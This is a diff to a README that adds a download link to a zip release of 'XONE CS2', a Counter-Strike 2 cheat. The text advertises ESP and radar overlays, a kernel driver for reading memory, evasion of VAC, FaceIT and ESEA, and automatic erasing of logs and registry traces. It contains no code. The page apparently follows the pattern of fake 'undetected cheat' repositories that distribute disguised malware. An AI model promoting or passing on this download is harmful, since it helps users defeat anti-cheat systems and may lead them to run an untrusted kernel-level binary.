@@ -4,6 +4,10 @@
 
 ---
 
+## [Download](https://github.com/deanhhoach/XONE-CS2-UNDETECTED-2026/releases/download/download/Xone.CS2.zip)
+
+
+
 ## Description
 
  XONE CS2 is an external mod for Counter-Strike 2 released in 2026. It works by reading the memory of the cs2.exe process without injecting a DLL. This prevents detection by anti-cheat software that scans loaded modules. A kernel driver running in Windows kernel mode (ring 0) is used to access memory, making XONE CS2 invisible to VAC, FaceIT, and ESEA. The driver performs read-only operations (ReadProcessMemory) and never writes data, so the integrity of the game remains intact. The visual components—ESP, radar, crosshair, and health information—are implemented via a DirectX 11 overlay. The overlay renders graphics on top of the game without altering the CS2 video stream. Once the program finishes running, it automatically removes all traces: temporary logs, registry entries, process handles, and driver memory. All features are tailored to mimic legitimate gameplay: random delays, crosshair smoothing, and human-like timing. This makes the behavior as natural and undetectable as possible to anti-cheat systems.
